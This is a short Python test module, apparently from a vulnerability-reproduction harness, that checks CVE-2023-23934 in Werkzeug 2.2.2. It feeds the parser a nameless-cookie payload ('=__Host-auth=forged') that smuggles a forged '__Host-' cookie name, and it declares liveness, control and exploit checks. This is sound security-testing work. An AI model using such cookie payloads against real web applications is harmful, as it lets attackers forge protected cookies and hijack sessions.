"""CVE-2023-23934 -- Werkzeug parses a nameless cookie's value as cookies.

2.2.2 -> 2.2.3. A browser may send ``=value``; 2.2.2 then re-parsed that value as
a further cookie string, so an attacker who could set a nameless cookie could
forge a ``__Host-`` prefixed name they are not allowed to set directly.

Oracle, declared before execution: the mapping returned by ``parse_cookie``
contains the key ``__Host-auth``. The oracle reads a parsed *key*, not a
substring of the header the probe supplied.
"""

from __future__ import annotations

import os

from ._support import pinned_version

DIST = "Werkzeug"
MODULE = "werkzeug"

_HOSTILE = "=__Host-auth=forged"
_FORGED_KEY = "__Host-auth"


def _parse(header: str) -> dict:
    from werkzeug.http import parse_cookie

    return dict(parse_cookie(header))


def liveness(ctx: dict) -> tuple[bool, str]:
    """The parser must parse an ordinary cookie header, and the pin must match."""
    origin = pinned_version(DIST, MODULE, ctx["version"], ctx["pin_dir"])
    got = _parse("session=abc; theme=dark")
    ok = got.get("session") == "abc" and got.get("theme") == "dark"
    return ok, f"benign parse -> {got} from {os.path.basename(origin)}"


def control(ctx: dict) -> tuple[bool, str]:
    """The same oracle on a header with no nameless cookie. Must NOT fire."""
    got = _parse("session=abc; other=1")
    return _FORGED_KEY in got, f"benign header -> keys={sorted(got)}"


def exploit(ctx: dict) -> tuple[bool, str]:
    got = _parse(_HOSTILE)
    return _FORGED_KEY in got, f"parsed keys={sorted(got)} values={got}"
